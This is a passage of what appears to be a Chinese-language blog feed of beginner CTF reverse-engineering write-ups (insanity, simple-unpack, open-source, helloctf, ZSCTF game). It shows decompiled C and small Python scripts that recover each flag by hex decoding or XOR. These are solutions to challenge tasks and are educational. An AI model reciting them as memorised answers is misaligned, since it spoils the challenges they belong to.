class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">    m = ord(a[i]) ^ ord(b[i % <span class="number">7</span>])</span><br><span class="line">    key += chr(m)</span><br><span class="line">print(key)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>9447 CTF 2014 insanity</title>
      <link href="/2019/04/28/9447-CTF-2014-insanity/"/>
      <url>/2019/04/28/9447-CTF-2014-insanity/</url>
      
        <content type="html"><![CDATA[<p><a href="insanity">一道假的题</a>，运行随机暂停一段时间，之后打印flag……</p><p>这道题太简单，按理说不应该单发的，但是有点小强迫症，要把攻防世界逆向的每道题都单发出来。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Reticulating splines, please wait.."</span>);</span><br><span class="line">  sleep(<span class="number">5u</span>);</span><br><span class="line">  v3 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v3);</span><br><span class="line">  v4 = rand();</span><br><span class="line">  <span class="built_in">puts</span>((&amp;strs)[v4 % <span class="number">0xA</span>]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><del>双击666</del>双击&amp;strs直接出。<del>或者运行随缘出。</del></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">./insanity</span><br><span class="line">Reticulating splines, please wait..</span><br><span class="line">9447&#123;This_is_a_flag&#125;</span><br><span class="line"> ./insanity</span><br><span class="line">Reticulating splines, please wait..</span><br><span class="line">Have you considered becoming a vacuum cleaner? You&apos;re pretty good at sucking.</span><br><span class="line"> ./insanity</span><br><span class="line">Reticulating splines, please wait..</span><br><span class="line">I&apos;ve got a good feeling about this one..... wait no. Maybe next time.</span><br><span class="line"> ./insanity</span><br><span class="line">Reticulating splines, please wait..</span><br><span class="line">Have you considered becoming a vacuum cleaner? You&apos;re pretty good at sucking.</span><br><span class="line"> ./insanity</span><br><span class="line">Reticulating splines, please wait..</span><br><span class="line">Congrats, you hacked me!</span><br><span class="line">$ </span><br><span class="line"> ./insanity</span><br><span class="line">Reticulating splines, please wait..</span><br><span class="line">#define YOU &quot;massive failure&quot;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>simple-unpack</title>
      <link href="/2019/04/28/simple-unpack/"/>
      <url>/2019/04/28/simple-unpack/</url>
      
        <content type="html"><![CDATA[<p>提示里面已经说得很清楚了，<a href="simple2">文件</a>经过了加壳，所以用<code>detect it easy</code>查壳，</p><p><img src="/2019/04/28/simple-unpack/1.png" alt="查壳结果" title="DIE查壳"></p><p>发现是UPX3.91，拿到虚拟机里面脱壳，脱壳后先运行一下看看：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./simple2</span><br><span class="line">abcdefgh1234567890</span><br><span class="line">Try again!</span><br></pre></td></tr></table></figure></p><p>再用IDA看：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s1; <span class="comment">// [rsp+0h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  _isoc99_scanf((<span class="keyword">unsigned</span> __int64)<span class="string">"%96s"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, flag) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Congratulations!"</span>, flag);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Try again!"</span>, flag);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>……脱壳后直接就能看到flag了，说白了这道题就是练习脱壳的，也许考察手动脱壳2333，不过不知道Linux下有什么手动脱壳的方法，gdb的话甚至不知道怎么下断点。</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackYou CTF open-source</title>
      <link href="/2019/04/28/HackYou-CTF-open-source/"/>
      <url>/2019/04/28/HackYou-CTF-open-source/</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="code.c">这道题</a>给出了源码，不过就算不给我也会自觉F5的🙄。<br>为了凑文章字数，把源码粘到了下面2333。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">4</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"what?\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> first = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">if</span> (first != <span class="number">0xcafe</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"you are wrong, sorry.\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> second = atoi(argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">if</span> (second % <span class="number">5</span> == <span class="number">3</span> || second % <span class="number">17</span> != <span class="number">8</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"ha, you won't get it!\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(<span class="string">"h4cky0u"</span>, argv[<span class="number">3</span>])) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"so close, dude!\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Brr wrrr grr\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> hash = first * <span class="number">31337</span> + (second % <span class="number">17</span>) * <span class="number">11</span> + <span class="built_in">strlen</span>(argv[<span class="number">3</span>]) - <span class="number">1615810207</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Get your key: "</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%x\n"</span>, hash);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个既然给了代码就没什么说的，直接看就好了。</p><p>小知识点：</p><ol><li><ul><li>argc – 命令行参数 总个数，包括 可执行程序名。</li><li>argv[i] – 第 i 个参数。</li><li>argv[0] – 可执行程序名。</li></ul></li><li>atoi将字符串转换成整数。</li></ol><p>可以看出，程序要求输入3个参数，并且对应程序中的3个变量。</p><p>第一个参数应当等于<code>0xcafe</code>，第二个参数模5<strong>不等于</strong>3，模17<strong>等于</strong>8，第三个参数等于<code>h4cky0u</code>，接着程序计算了一个hash，是利用了前三个参数计算得到的。最后的key按十六进制输出就是hash。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">first=<span class="number">0xcafe</span></span><br><span class="line">second=<span class="number">25</span></span><br><span class="line">third=<span class="string">'h4cky0u'</span></span><br><span class="line">h=first*<span class="number">31337</span>+(second%<span class="number">17</span>)*<span class="number">11</span>+len(third)<span class="number">-1615810207</span></span><br><span class="line">print(<span class="string">'%x'</span> % h)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PediyCTF2018 helloctf</title>
      <link href="/2019/04/28/PediyCTF2018-helloctf/"/>
      <url>/2019/04/28/PediyCTF2018-helloctf/</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="helloctf.exe">这道题</a>提示是flag不是明文比较的，意味着shift+f12不能立刻出flag了23333。<br>目前的几道题我都省略了查壳（因为新手入门题要么没壳，要么直接工具脱。<br>逆向的大概流程应该是先查壳脱壳再静态分析最后动态调试吧。</p></blockquote><p>IDA查看:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp+0h] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+0h] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [esp+12h] [ebp-5Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v9[<span class="number">20</span>]; <span class="comment">// [esp+14h] [ebp-5Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// [esp+28h] [ebp-48h]</span></span><br><span class="line">  __int16 v11; <span class="comment">// [esp+48h] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// [esp+4Ah] [ebp-26h]</span></span><br><span class="line">  <span class="keyword">char</span> v13; <span class="comment">// [esp+4Ch] [ebp-24h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(&amp;v13, <span class="string">"437261636b4d654a757374466f7246756e"</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;v10, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">    v11 = <span class="number">0</span>;</span><br><span class="line">    v12 = <span class="number">0</span>;</span><br><span class="line">    print(aPleaseInputYou, v6);</span><br><span class="line">    <span class="built_in">scanf</span>(aS, v9);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(v9) &gt; <span class="number">0x11</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v4 = v9[v3];</span><br><span class="line">      <span class="keyword">if</span> ( !v4 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">sprintf</span>(&amp;v8, asc_408044, v4);</span><br><span class="line">      <span class="built_in">strcat</span>(&amp;v10, &amp;v8);</span><br><span class="line">      ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v3 &lt; <span class="number">17</span> );</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;v10, &amp;v13) )</span><br><span class="line">      print(aSuccess, v7);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      print(aWrong, v7);</span><br><span class="line">  &#125;</span><br><span class="line">  print(aWrong, v7);</span><br><span class="line">  result = stru_408090._cnt-- - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( stru_408090._cnt &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> _filbuf(&amp;stru_408090);</span><br><span class="line">  ++stru_408090._ptr;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以推测出，flag长度为17，在while(1)内部的do-while中，程序逐个取出输入字符串的字符，格式化处理后存入v10，最后比较v10和v13，v13在上面已经赋值为437261636b4d654a757374466f7246756e，格式化处理的sprintf中，格式化参数为%x，即转换为十六进制，所以flag是按十六进制存储的，只要把v13转化回来就可以了。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a=[<span class="number">0x43</span>,<span class="number">0x72</span>,<span class="number">0x61</span>,<span class="number">0x63</span>,<span class="number">0x6b</span>,<span class="number">0x4d</span>,<span class="number">0x65</span>,<span class="number">0x4a</span>,<span class="number">0x75</span>,<span class="number">0x73</span>,<span class="number">0x74</span>,<span class="number">0x46</span>,<span class="number">0x6f</span>,<span class="number">0x72</span>,<span class="number">0x46</span>,<span class="number">0x75</span>,<span class="number">0x6e</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    print(chr(i),end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ZSCTF game</title>
      <link href="/2019/04/28/ZSCTF-game/"/>
      <url>/2019/04/28/ZSCTF-game/</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="game.exe">这道题</a>是一个命令行小游戏，就是一个一维的开关灯游戏，点亮一盏灯，它前后的两盏灯就会改变状态。这道题第一次做我是玩通关了拿到flag的。。。<br>玩通关的方法就是按顺序输入一圈……</p></blockquote><p>IDA进入main，看汇编感觉太乱了，直接反编译看。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">cdecl <span class="title">main_0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+DCh] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+F4h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  sub_45A7BE(&amp;unk_50B110);</span><br><span class="line">  sub_45A7BE(&amp;unk_50B158);</span><br><span class="line">  sub_45A7BE(&amp;unk_50B1A0);</span><br><span class="line">  sub_45A7BE(&amp;unk_50B1E8);</span><br><span class="line">  sub_45A7BE(&amp;unk_50B230);</span><br><span class="line">  sub_45A7BE(&amp;unk_50B278);</span><br><span class="line">  sub_45A7BE(&amp;unk_50B2C0);</span><br><span class="line">  sub_45A7BE(&amp;unk_50B308);</span><br><span class="line">  sub_45A7BE(<span class="string">"二                                                     |\n"</span>);</span><br><span class="line">  sub_45A7BE(<span class="string">"|              by 0x61                                 |\n"</span>);</span><br><span class="line">  sub_45A7BE(<span class="string">"|                                                      |\n"</span>);</span><br><span class="line">  sub_45A7BE(<span class="string">"|------------------------------------------------------|\n"</span>);</span><br><span class="line">  sub_45A7BE(</span><br><span class="line">    <span class="string">"Play a game\n"</span></span><br><span class="line">    <span class="string">"The n is the serial number of the lamp,and m is the state of the lamp\n"</span></span><br><span class="line">    <span class="string">"If m of the Nth lamp is 1,it's on ,if not it's off\n"</span></span><br><span class="line">    <span class="string">"At first all the lights were closed\n"</span>);</span><br><span class="line">  sub_45A7BE(<span class="string">"Now you can input n to change its state\n"</span>);</span><br><span class="line">  sub_45A7BE(</span><br><span class="line">    <span class="string">"But you should pay attention to one thing,if you change the state of the Nth lamp,the state of (N-1)th and (N+1)th w"</span></span><br><span class="line">    <span class="string">"ill be changed too\n"</span>);</span><br><span class="line">  sub_45A7BE(<span class="string">"When all lamps are on,flag will appear\n"</span>);</span><br><span class="line">  sub_45A7BE(<span class="string">"Now,input n \n"</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_45A7BE(<span class="string">"input n,n(1-8)\n"</span>);</span><br><span class="line">      sub_459418();</span><br><span class="line">      sub_45A7BE(<span class="string">"n="</span>);</span><br><span class="line">      sub_4596D4(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">      sub_45A7BE(<span class="string">"\n"</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">8</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      sub_45A7BE(<span class="string">"sorry,n error,try again\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_4576D6(v1 - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i &gt;= <span class="number">9</span> )</span><br><span class="line">          j____report_rangecheckfailure();</span><br><span class="line">        byte_532E28[i] = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    j__system(<span class="string">"CLS"</span>);</span><br><span class="line">    sub_458054();</span><br><span class="line">    <span class="keyword">if</span> ( byte_532E28[<span class="number">0</span>] == <span class="number">1</span></span><br><span class="line">      &amp;&amp; byte_532E28[<span class="number">1</span>] == <span class="number">1</span></span><br><span class="line">      &amp;&amp; byte_532E28[<span class="number">2</span>] == <span class="number">1</span></span><br><span class="line">      &amp;&amp; byte_532E28[<span class="number">3</span>] == <span class="number">1</span></span><br><span class="line">      &amp;&amp; byte_532E28[<span class="number">4</span>] == <span class="number">1</span></span><br><span class="line">      &amp;&amp; byte_532E28[<span class="number">5</span>] == <span class="number">1</span></span><br><span class="line">      &amp;&amp; byte_532E28[<span class="number">6</span>] == <span class="number">1</span></span><br><span class="line">      &amp;&amp; byte_532E28[<span class="number">7</span>] == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_457AB4();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很容易看出来sub_457AB4()这个应该是灯全部点亮，符合通关条件之后打印flag的函数。<br>IDA跟进去，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_457AB4</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> sub_45E940();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再跟进，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*上面是一坨数据，省略不复制了*/</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">56</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(&amp;v2 + i) ^= *(&amp;v59 + i);</span><br><span class="line">    *(&amp;v2 + i) ^= <span class="number">0x13</span>u;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> sub_45A7BE(<span class="string">"%s\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就很清楚地看到flag是通过简单的两步异或计算出来的，异或的密钥和密文都在这个函数里了，于是写脚本：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">xor=[<span class="number">18</span>,<span class="number">64</span>,<span class="number">98</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">48</span>,<span class="number">49</span>,<span class="number">65</span>,<span class="number">32</span>,<span class="number">12</span>,<span class="number">48</span>,<span class="number">65</span>,<span class="number">31</span>,<span class="number">78</span>,<span class="number">62</span>,<span class="number">32</span>,<span class="number">49</span>,<span class="number">32</span>,<span class="number">1</span>,<span class="number">57</span>,<span class="number">96</span>,<span class="number">3</span>,<span class="number">21</span>,<span class="number">9</span>,<span class="number">4</span>,<span class="number">62</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">44</span>,<span class="number">65</span>,<span class="number">78</span>,<span class="number">32</span>,<span class="number">16</span>,<span class="number">97</span>,<span class="number">54</span>,<span class="number">16</span>,<span class="number">44</span>,<span class="number">52</span>,<span class="number">32</span>,<span class="number">64</span>,<span class="number">89</span>,<span class="number">45</span>,<span class="number">32</span>,<span class="number">65</span>,<span class="number">15</span>,<span class="number">34</span>,<span class="number">18</span>,<span class="number">16</span>,<span class="number">0</span>]</span><br><span class="line">key=[<span class="number">123</span>, <span class="number">32</span>, <span class="number">18</span>, <span class="number">98</span>, <span class="number">119</span>, <span class="number">108</span>, <span class="number">65</span>, <span class="number">41</span>, <span class="number">124</span>, <span class="number">80</span>, <span class="number">125</span>, <span class="number">38</span>, <span class="number">124</span>, <span class="number">111</span>, <span class="number">74</span>, <span class="number">49</span>, <span class="number">83</span>, <span class="number">108</span>, <span class="number">94</span>, <span class="number">108</span>, <span class="number">84</span>, <span class="number">6</span>, <span class="number">96</span>, <span class="number">83</span>, <span class="number">44</span>, <span class="number">121</span>, <span class="number">104</span>, <span class="number">110</span>, <span class="number">32</span>, <span class="number">95</span>, <span class="number">117</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">123</span>, <span class="number">127</span>, <span class="number">119</span>, <span class="number">96</span>, <span class="number">48</span>, <span class="number">107</span>, <span class="number">71</span>, <span class="number">92</span>, <span class="number">29</span>, <span class="number">81</span>, <span class="number">107</span>, <span class="number">90</span>, <span class="number">85</span>, <span class="number">64</span>, <span class="number">12</span>, <span class="number">43</span>, <span class="number">76</span>, <span class="number">86</span>, <span class="number">13</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">117</span>, <span class="number">126</span>, <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">56</span>):</span><br><span class="line">    a = key[i]</span><br><span class="line">    a ^= <span class="number">0x13</span></span><br><span class="line">    a ^= xor[i]</span><br><span class="line">    flag += chr(a)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>跑一下就ok了。</p><p>小知识点：</p><p>int sprintf( char <em>buffer, const char </em>format, [ argument] … );</p><p>参数列表</p><ul><li>buffer：char型指针，指向将要写入的字符串的缓冲区。</li><li>format：格式化字符串。</li><li>[argument]…：可选参数，可以是任何类型的数据。</li></ul><p>extern char <em>strcat(char 